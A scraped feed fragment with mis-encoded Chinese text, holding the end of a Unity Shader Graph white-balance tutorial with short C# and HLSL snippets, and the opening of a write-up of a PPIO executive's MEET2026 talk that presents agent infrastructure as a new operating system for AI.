<li>ç®€åŒ–è‰²å½©ç©ºé—´è½¬æ¢çŸ©é˜µ</li>
<li>åœ¨ä½ç«¯è®¾å¤‡ä¸Šç¦ç”¨å®æ—¶ç™½å¹³è¡¡</li>
</ul>
<h3 data-id="heading-20"><strong>æµ‹è¯•ä¸éªŒè¯æ–¹æ³•</strong></h3>
<ul>
<li>ä½¿ç”¨æ ‡å‡†è‰²å¡éªŒè¯è‰²å½©å‡†ç¡®æ€§</li>
<li>åœ¨ä¸åŒå…‰ç…§ç¯å¢ƒä¸‹æµ‹è¯•æ•ˆæœè¡¨ç°</li>
<li>å¼€å±•è·¨å¹³å°æ€§èƒ½ä¸å…¼å®¹æ€§æµ‹è¯•</li>
</ul>
<h2 data-id="heading-21"><strong>æ‰©å±•åº”ç”¨æ¡ˆä¾‹</strong></h2>
<h3 data-id="heading-22"><strong>å½±è§†çº§è°ƒè‰²ç³»ç»Ÿ</strong></h3>
<p>é€šè¿‡ç»„åˆå¤šä¸ªç™½å¹³è¡¡èŠ‚ç‚¹æ„å»ºä¸“ä¸šè°ƒè‰²æµç¨‹ï¼š</p>
<p>[Input] â†’ [White Balance] â†’ [Color Grade] â†’ [LUT] â†’ [Output]</p>
<h3 data-id="heading-23"><strong>åŠ¨æ€å¤©æ°”ç³»ç»Ÿ</strong></h3>
<p>æ ¹æ®å¤©æ°”ç±»å‹è‡ªåŠ¨è°ƒæ•´ç™½å¹³è¡¡å‚æ•°ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">csharp
<span class="hljs-comment">// å¤©æ°”ç±»å‹ä¸è‰²æ¸©å¯¹åº”è¡¨</span>
Dictionary&lt;WeatherType, <span class="hljs-built_in">float</span>&gt; weatherTemperatureMap = <span class="hljs-keyword">new</span>()
{
    { WeatherType.ClearDay, <span class="hljs-number">0.8f</span> },
    { WeatherType.Rainy, <span class="hljs-number">-0.5f</span> },
    { WeatherType.Foggy, <span class="hljs-number">1.2f</span> }
};
</code></pre>
<h3 data-id="heading-24"><strong>è‰ºæœ¯é£æ ¼åŒ–å¤„ç†</strong></h3>
<p>é€šè¿‡æç«¯å‚æ•°è®¾ç½®åˆ›é€ ç‰¹æ®Šè‰ºæœ¯æ•ˆæœï¼š</p>
<pre><code class="hljs language-c" lang="c">hlsl
<span class="hljs-comment">// å¤å¤ç”µå½±é£æ ¼</span>
float3 retroEffect = whiteBalance(In, <span class="hljs-number">-2.0f</span>, <span class="hljs-number">0.3f</span>);
</code></pre>
<p>White BalanceèŠ‚ç‚¹æ˜¯URP Shader Graphä¸­ç”¨äºè‰²å½©æ ¡æ­£çš„æ ¸å¿ƒå·¥å…·ï¼Œå€ŸåŠ©ç§‘å­¦çš„è‰²å½©ç©ºé—´è½¬æ¢ç®—æ³•ï¼Œå®ç°ä¸“ä¸šçº§çš„ç™½å¹³è¡¡è°ƒèŠ‚ã€‚</p>
<hr/>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">ã€Unity Shader Graph ä½¿ç”¨ä¸ç‰¹æ•ˆå®ç°ã€‘</a><strong>ä¸“æ -ç›´è¾¾</strong>
ï¼ˆæ¬¢è¿<em>ç‚¹èµç•™è¨€</em>æ¢è®¨ï¼Œæ›´å¤šäººåŠ å…¥è¿›æ¥èƒ½æ›´åŠ å®Œå–„è¿™ä¸ªæ¢ç´¢çš„è¿‡ç¨‹ï¼ŒğŸ™ï¼‰</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PPIOå§šæ¬£ï¼šAIæ­£åœ¨è¿›å…¥è‡ªä¸»è¡ŒåŠ¨ä¸åˆ›é€ æ—¶ä»£ï¼Œæ™ºèƒ½ä½“éœ€è¦å…¨æ–°çš„æ“ä½œç³»ç»Ÿï½œMEET2026]]></title>    <link>https://juejin.cn/post/7583971282891931700</link>    <guid>https://juejin.cn/post/7583971282891931700</guid>    <pubDate>2025-12-16T02:39:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583971282891931700" data-draft-id="7583921477614452771" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PPIOå§šæ¬£ï¼šAIæ­£åœ¨è¿›å…¥è‡ªä¸»è¡ŒåŠ¨ä¸åˆ›é€ æ—¶ä»£ï¼Œæ™ºèƒ½ä½“éœ€è¦å…¨æ–°çš„æ“ä½œç³»ç»Ÿï½œMEET2026"/> <meta itemprop="keywords" content="AIGC,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-16T02:39:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é‡å­ä½"/> <meta itemprop="url" content="https://juejin.cn/user/2858385963484488"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PPIOå§šæ¬£ï¼šAIæ­£åœ¨è¿›å…¥è‡ªä¸»è¡ŒåŠ¨ä¸åˆ›é€ æ—¶ä»£ï¼Œæ™ºèƒ½ä½“éœ€è¦å…¨æ–°çš„æ“ä½œç³»ç»Ÿï½œMEET2026
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2858385963484488/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é‡å­ä½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T02:39:14.000Z" title="Tue Dec 16 2025 02:39:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>éšç€ AI ä»å›ç­”é—®é¢˜è¿ˆå‘è‡ªä¸»æ‰§è¡Œå’Œåˆ›é€ ï¼Œè¡Œä¸šå¼€å§‹è¿›å…¥çœŸæ­£çš„ Agentic AI è½åœ°å…ƒå¹´ã€‚è¿™ä¸ä»…æ”¹å˜äº†åº”ç”¨å½¢æ€ï¼Œä¹Ÿæ­£åœ¨é‡å¡‘æ•´ä¸ª AI æŠ€æœ¯æ ˆçš„åº•å±‚é€»è¾‘ã€‚</p>
<p>ä¸æ­¤åŒæ—¶ï¼Œæ™ºèƒ½ä½“ä½“ç³»ç»“æ„çš„å¤æ‚åº¦å‘ˆæŒ‡æ•°çº§å¢é•¿ï¼Œä»ä»»åŠ¡è§„åˆ’ã€å·¥å…·è°ƒç”¨åˆ°é•¿æœŸè®°å¿†ï¼Œæ¯ä¸€ç¯èŠ‚éƒ½å¯¹åº•å±‚æ¡†æ¶æå‡ºäº†æ›´é«˜è¦æ±‚ã€‚å¯¹æ­¤ï¼Œ<strong>PPIO è”åˆåˆ›å§‹äººå…¼ CEO å§šæ¬£</strong>è¡¨ç¤ºï¼š</p>
<blockquote>
<p>èƒ½çœ‹åˆ°æ— è®ºæ˜¯ PC æ—¶ä»£ï¼Œè¿˜æ˜¯ç§»åŠ¨æ—¶ä»£ã€äº‘æ—¶ä»£ï¼Œæ“ä½œç³»ç»Ÿæ‰æ˜¯æœ€æ ¸å¿ƒçš„ä¸­é—´å±‚ã€‚</p>
</blockquote>
<p>è¿™æ„å‘³ç€ï¼Œæœªæ¥çš„ AI åº”ç”¨å°†ä»å›ç­”é—®é¢˜çš„å·¥å…·è½¬å‘èƒ½å¤Ÿç›´æ¥å®Œæˆä»»åŠ¡çš„åŠ©æ‰‹ï¼Œè€Œè¦æ‰¿è½½è¿™ç±»èƒ½åŠ›ï¼Œè¡Œä¸šè¿«åˆ‡éœ€è¦ä¸€ç§æ–°çš„åŸºç¡€è®¾æ–½â€”â€”Agent æ—¶ä»£çš„æ“ä½œç³»ç»Ÿã€‚</p>
<p>åœ¨æœ¬æ¬¡<strong>é‡å­ä½ MEET2026 æ™ºèƒ½æœªæ¥å¤§ä¼š</strong>ä¸Šï¼Œå§šæ¬£å›´ç»•æ™ºèƒ½ä½“æ¼”è¿›ã€Agent Infra ç­‰å…³é”®è¯åˆ†äº«äº†è‡ªå·±å¯¹ AI åº•å±‚åŸºç¡€è®¾æ–½æ¶æ„é‡å¡‘çš„åˆ¤æ–­ï¼š</p>
<p>ä»Šå¤©çš„ Agent ä¼šæˆä¸ºæœªæ¥ AI åº”ç”¨çš„ä¸»åŠ›ï¼Œè€Œ Agent Infra ä¼šæˆä¸ºä¸‹ä¸€ä¸ª AI æ—¶ä»£çš„æ“ä½œç³»ç»Ÿã€‚</p>
<p>æ— è®ºæ¨¡å‹èƒ½åŠ›å¦‚ä½•æå‡ï¼Œæ— è®ºåº”ç”¨å½¢æ€å¦‚ä½•æ¼”è¿›ï¼Œæœªæ¥è¶‹åŠ¿éƒ½æŒ‡å‘åŒä¸€ä¸ªç›®æ ‡ï¼šåœ¨ AI æ—¶ä»£ï¼Œé€šè¿‡æ–°çš„ Runtime ä½“ç³»ï¼Œå®ç°æ¨¡å‹èƒ½åŠ›ã€å·¥å…·èƒ½åŠ›ä¸æ‰§è¡Œèƒ½åŠ›çš„é«˜åº¦èåˆã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/787e82154e7648fbb20edc41ecdc3a7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457554&amp;x-signature=Bg70ccx%2F%2B0hItlUrb%2BgCmDhvfcg%3D" alt="" loading="lazy"/></p>
<p>ä¸ºäº†å®Œæ•´ä½“ç°å§šæ¬£çš„æ€è€ƒï¼Œåœ¨ä¸æ”¹å˜åŸæ„çš„åŸºç¡€ä¸Šï¼Œé‡å­ä½å¯¹æ¼”è®²å†…å®¹è¿›è¡Œäº†ç¼–è¾‘æ•´ç†ï¼Œå¸Œæœ›èƒ½ç»™ä½ å¸¦æ¥æ›´å¤šå¯å‘ã€‚</p>
<p><em>MEET2026 æ™ºèƒ½æœªæ¥å¤§ä¼šæ˜¯ç”±é‡å­ä½ä¸»åŠçš„è¡Œä¸šå³°ä¼šï¼Œ20 ä½™ä½äº§ä¸šä»£è¡¨ä¸ä¼šè®¨è®ºã€‚çº¿ä¸‹å‚ä¼šè§‚ä¼— 1000+ï¼Œçº¿ä¸Šç›´æ’­è§‚ä¼— 320 ä¸‡ +ï¼Œè·å¾—äº†ä¸»æµåª’ä½“çš„å¹¿æ³›å…³æ³¨ä¸æŠ¥é“ã€‚</em></p>
<h2 data-id="heading-0">æ ¸å¿ƒè§‚ç‚¹æ¢³ç†</h2>
<ul>
<li>
<p>AI ä¸å†åªæ˜¯å›ç­”é—®é¢˜çš„å·¥å…·ï¼Œè€Œèƒ½åƒæ™ºèƒ½ä½“ä¸€æ ·ï¼Œè‡ªåŠ¨åŒ–åœ°æ¯”ä»·ã€ä¸‹å•ã€æ‰§è¡Œä»»åŠ¡ï¼Œæ•´ä¸ªç”Ÿæ€æ­£åœ¨ä» â€œç”Ÿæˆâ€ èµ°å‘â€œæ‰§è¡Œâ€ã€‚</p>
</li>
<li>
<p>å½“å‰å¾ˆå¤šäº§å“æŠŠå·¥ä½œæµã€ç¼–æ’å·¥å…·å½“ä½œ Agentï¼Œä½†è¿™åªæ˜¯æ—©æœŸå½¢æ€ï¼ŒçœŸæ­£çš„æ™ºèƒ½ä½“éœ€è¦è‡ªä¸»åˆ†æã€å†³ç­–ä¸æ‰§è¡Œã€‚</p>
</li>
<li>
<p>ä¼ ç»Ÿ AI å·¥å…·åªæ˜¯å¢å¼ºæœç´¢æˆ–å¤„ç†èƒ½åŠ›ï¼Œå¹¶ä¸èƒ½æ”¯æ’‘å®Œæ•´çš„æ™ºèƒ½ä½“è¿è¡Œï¼›çœŸæ­£çš„ Agent éœ€è¦æ–°çš„ç³»ç»Ÿæ¶æ„æ”¯æ’‘ï¼Œä¸èƒ½ä¾èµ–æ—§å¼åº”ç”¨æˆ–å·¥ä½œæµä½“ç³»ã€‚</p>
</li>
<li>
<p>æ¨¡å‹èƒ½åŠ›å†³å®šä¸Šé™ï¼Œä½†æ™ºèƒ½ä½“èƒ½å¦è·‘èµ·æ¥ã€èƒ½å¦åœ¨å„ç§ç¯å¢ƒé‡Œé€šç”¨è½åœ°ï¼Œå…³é”®åœ¨äº Runtimeã€‚</p>
</li>
</ul>
<p><em>ä»¥ä¸‹ä¸ºå§šæ¬£æ¼”è®²å…¨æ–‡ï¼š</em></p>
<h2 data-id="heading-1">AI ä»ç”Ÿæˆå¼è¿ˆå‘ Agent æ—¶ä»£</h2>
<p>å¤§å®¶å¥½ï¼Œæˆ‘ä»Šå¤©åˆ†äº«çš„ä¸»é¢˜ä¹Ÿæ˜¯å¾ˆå¤šå˜‰å®¾è®²çš„æ–°è¯é¢˜ <strong>Agentic AI</strong>â€”â€”ä»Šå¹´ AI è¿›å…¥äº†åˆ°ä¸€ä¸ªå…¨æ–°çš„æ—¶ä»£ã€‚</p>
<p>è¿‡å»ä¸€å‘¨ï¼Œè±†åŒ…æ‰‹æœºæ¨ªç©ºå‡ºä¸–ï¼Œå®ƒèƒ½å¤Ÿè‡ªåŠ¨å¸®ä½ ä¸‹å•ã€æ¯”ä»·ã€æ‰§è¡Œä»»åŠ¡ï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬ä»Šå¹´æ‰€çœ‹åˆ°çš„â€”â€”ä» Generative AI å‘ Agent AI çš„è¿›æ­¥ã€‚</p>
<p>AI ä»¥å‰æ›´å¤šåªæ˜¯åšä¸€äº›èŠå¤©ã€å›ç­”é—®é¢˜ï¼›è€Œä»å¹´åˆçš„ Manusã€Gensparkï¼Œåˆ°ç°åœ¨çš„è±†åŒ…æ‰‹æœºï¼Œè¿™äº›äº§å“è¶Šæ¥è¶Šæ¸…æ™°åœ°å±•ç¤ºå‡º AI åº”ç”¨å¼€å§‹åƒæ™ºèƒ½ä½“ä¸€æ ·è‡ªåŠ¨åŒ–å®Œæˆä»»åŠ¡å’Œè¿›è¡Œåˆ›ä½œã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/634fd9fad50c4eef8a4a4288adec6724~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457554&amp;x-signature=ijuDmHC9Jabxu1dDlTZnDyciPys%3D" alt="" loading="lazy"/></p>
<p>ä»Šå¤©æåˆ°æ™ºèƒ½ä½“è¿™ä¸ªè¯é¢˜çš„æ—¶å€™ï¼Œæˆ‘å‘ç°è¡Œä¸šå†…ï¼Œç‰¹åˆ«å›½å†…å¾ˆå¤šäººæŠŠå®ƒå®šä½æˆå·¥ä½œæµã€‚</p>
<p>ä»¥å‰åƒæ‰£å­é‚£æ ·çš„ç¼–æ’å·¥å…·ï¼Œåªèƒ½ç®—æ˜¯æœ€æ—©æœŸçš„æ™ºèƒ½ä½“å½¢æ€ï¼Œå¹¶ä¸æ˜¯å®Œå…¨ä½“ã€‚</p>
<p>ä»Šå¤©çœŸæ­£çš„å®Œå…¨æ€æ™ºèƒ½ä½“éœ€è¦å…·å¤‡è‡ªä¸»åˆ†æã€è‡ªä¸»å†³ç­–ä»¥åŠè‡ªåŠ¨åŒ–å®Œæˆä»»åŠ¡çš„èƒ½åŠ›ï¼Œè€Œæ‰§è¡Œä¸è½åœ°æ­£æ˜¯å…¶ä¸­çš„å…³é”®ç¯èŠ‚ã€‚</p>
<p>åŒæ—¶ï¼Œæˆ‘ä»¬ä¹‹å‰åœ¨å¾ˆå¤š AI å·¥å…·ä¸­çœ‹åˆ°çš„ Deep Research åŠŸèƒ½ï¼Œè™½ç„¶èƒ½å¸®åŠ©åšæœç´¢å’Œå¤„ç†ï¼Œä½†æˆ‘è®¤ä¸ºè¿™ä»ç„¶åªæ˜¯æ™ºèƒ½ä½“çš„æ—©æœŸé˜¶æ®µï¼ŒçœŸæ­£çš„æ™ºèƒ½ä½“éœ€è¦å…¨æ–°çš„æ¶æ„å’Œå…¨æ–°çš„å½¢æ€ã€‚</p>
<h2 data-id="heading-2">çœŸæ­£çš„æ™ºèƒ½ä½“éœ€è¦ä»èƒ½åŠ›å †å èµ°å‘ç³»ç»ŸåŒ–ç»“æ„</h2>
<p>2023 å¹´çš„æ—¶å€™ï¼ŒOpenAI ç ”ç©¶å‘˜ LilianWeng ä¹Ÿå‘äº†ä¸€ç¯‡å¾ˆè‘—åçš„è®ºæ–‡ï¼Œã€ŠLLM Powered Autonomous Agentsã€‹ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« é‡Œé¢æ­ç¤ºäº†çœŸæ­£çš„æ™ºèƒ½ä½“æœ‰å“ªäº›æ ¸å¿ƒçš„ç»„ä»¶ï¼ŒåŒ…æ‹¬å››ä¸ªæ ¸å¿ƒçš„å…ƒç´ ï¼š<strong>Memoryã€Planningã€Toolsã€Actionã€‚</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d0fba0334f446acabb0c3892e8d7b5c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457554&amp;x-signature=wW4lQ5%2FqNMjRL7%2FRlGjSYwXdqwY%3D" alt="" loading="lazy"/></p>
<p>åœ¨æ¢³ç†æ¯ä¸ªæ ¸å¿ƒç»„ä»¶çš„ç‰¹ç‚¹å’Œç‰¹æ€§æ—¶ï¼Œå‘ç°äº†è¿™æ ·ä¸€äº›ç±»æ¯”ï¼šå¦‚æœæŠŠæ™ºèƒ½ä½“å½“ä½œæ•°å­—ç”Ÿå‘½ä½“ï¼Œé‚£ä¹ˆ Memory æœ‰ç‚¹åƒå¤§è„‘çš„è®°å¿†åŠŸèƒ½ï¼Œè´Ÿè´£çŸ­æœŸè®°å¿†ã€é•¿æœŸè®°å¿†ï¼Œç”šè‡³éœ€è¦å…·å¤‡é—å¿˜èƒ½åŠ›ï¼›Planning æ›´åƒæ€è€ƒå•å…ƒï¼Œèƒ½å¤Ÿè¿›è¡Œæ·±åº¦æ¨ç†å’Œæ·±åº¦åˆ†æã€‚</p>
<p>Toolsã€Action åˆ™æ›´åƒæˆ‘ä»¬çš„äº”å®˜ï¼Œèƒ½å¤Ÿæ„ŸçŸ¥å¤–éƒ¨ä¸–ç•Œå‘ç”Ÿäº†ä»€ä¹ˆï¼Œç”šè‡³åƒæ‰‹å’Œè„šä¸€æ ·å»å½±å“å’Œæ”¹é€ å¤–éƒ¨ä¸–ç•Œã€‚çœŸæ­£çš„æ™ºèƒ½ä½“ä¸ä»…æ˜¯æ‰§è¡Œçš„æœºå™¨ï¼Œæ›´é‡è¦çš„æ˜¯å…·å¤‡ä»æ€è€ƒåˆ°æ‰§è¡Œå†åˆ°åˆ†æçš„ä¸€æ•´å¥—<strong>ç»¼åˆç³»ç»Ÿ</strong>ã€‚</p>
<p>æˆ‘ä»¬æƒ³ä¸€æƒ³ï¼Œä»€ä¹ˆæ ·çš„ç³»ç»Ÿæ˜¯æ—¢èƒ½åšèµ„æºçš„ç®¡ç†åˆèƒ½åšè®°å¿†çš„ç®¡ç†ï¼Œç”šè‡³è°ƒç”¨å¤§é‡çš„å·¥å…·å‘¢ï¼Ÿ</p>
<p>æˆ‘è®¤ä¸ºä»Šå¤©çš„æ™ºèƒ½ä½“çš„åŸºç¡€è®¾æ–½æ›´åƒä»¥å‰çš„<strong>æ“ä½œç³»ç»Ÿ</strong>ï¼Œè¿™é‡Œæˆ‘åˆ—ä¸¾äº†ä¸€ä¸‹è¿‡å»ä¸‰å››åå¹´ä¸€ç³»åˆ—æ“ä½œç³»ç»Ÿçš„å‘å±•å’Œè¯ç”Ÿï¼Œèƒ½çœ‹åˆ°æ— è®ºä» PC æ—¶ä»£åˆ°ç§»åŠ¨æ—¶ä»£è¿˜æ˜¯åˆ°äº‘æ—¶ä»£ï¼Œæ“ä½œç³»ç»Ÿæ‰æ˜¯æœ€æ ¸å¿ƒçš„ä¸­é—´å±‚ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/885d452c93df459da65fb0e4a209254a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457554&amp;x-signature=6G9XgfUKx%2BtsuMFv2cC%2BjQIY4Ow%3D" alt="" loading="lazy"/></p>
<p>ä¸€æ–¹é¢ï¼Œå®ƒè¦ç®¡ç†å¤§é‡ä¸åŒçš„å¼‚æ„èµ„æºï¼ŒæŠŠè®¡ç®—èµ„æºã€ç¡¬ä»¶èµ„æºï¼Œä»¥åŠå„ç±»å¼‚æ„çš„è®°å¿†ã€å­˜å‚¨ã€ä¼ è¾“èƒ½åŠ›æ•´åˆèµ·æ¥ã€‚</p>
<p>å¦ä¸€æ–¹é¢ï¼Œè¿˜éœ€è¦æŠŠè¿™äº›èƒ½åŠ›æŠ½ç¦»å¹¶æŠ½è±¡æˆæ ‡å‡†åŒ–çš„åŠŸèƒ½è°ƒç”¨ï¼Œæš´éœ²ç»™ä¸Šå±‚åº”ç”¨ï¼Œè®©å¼€å‘è€…å¯ä»¥è½»æ¾è¿›è¡ŒäºŒæ¬¡å¼€å‘ï¼Œè€Œæ— éœ€é’ˆå¯¹æ¯ä¸€ç§ç¡¬ä»¶ç»“æ„å•ç‹¬å¼€å‘ã€‚</p>
<p>æ— è®ºæ˜¯åœ¨ PC æ—¶ä»£ã€æ‰‹æœºæ—¶ä»£ï¼Œè¿˜æ˜¯äº‘æ—¶ä»£ï¼Œæ“ä½œç³»ç»Ÿå§‹ç»ˆæ‰®æ¼”ç€è¿™æ ·çš„è§’è‰²ã€‚</p>
<h2 data-id="heading-3">Agent Infraï¼šæœªæ¥ AI æ—¶ä»£çš„æ–°æ“ä½œç³»ç»Ÿ</h2>
<p>æˆ‘æå‡ºä¸€ä¸ªçœ‹æ³•ï¼šä»Šå¤©æˆ‘ä»¬åšçš„ Agent Infraï¼Œæœ¬è´¨ä¸Šæ˜¯åœ¨æ„å»º <strong>AI æ—¶ä»£çš„æ“ä½œç³»ç»Ÿ</strong>ã€‚</p>
<p>ä¼ ç»Ÿæ“ä½œç³»ç»Ÿç®¡ç† CPUã€å†…å­˜ã€å­˜å‚¨ç­‰ç¡¬ä»¶èµ„æºï¼Œè€Œ Agent Infra ç®¡ç†çš„æ˜¯<strong>æ¨¡å‹èƒ½åŠ›</strong>ã€<strong>å·¥å…·è°ƒç”¨èƒ½åŠ›</strong>ï¼Œä»¥åŠ<strong>ä»»åŠ¡å’Œæ‰§è¡Œèƒ½åŠ›</strong>ï¼Œåœ¨è¿™ä¸ªç»´åº¦ä¸Šå®Œæˆèµ„æºç®¡ç†ã€ç»Ÿä¸€è°ƒåº¦ä¸æŠ½è±¡ï¼Œè®©ä¸Šå±‚å¼€å‘è€…èƒ½å¤Ÿæ›´æ–¹ä¾¿åœ°è¿›è¡Œåº”ç”¨æ„å»ºã€‚</p>
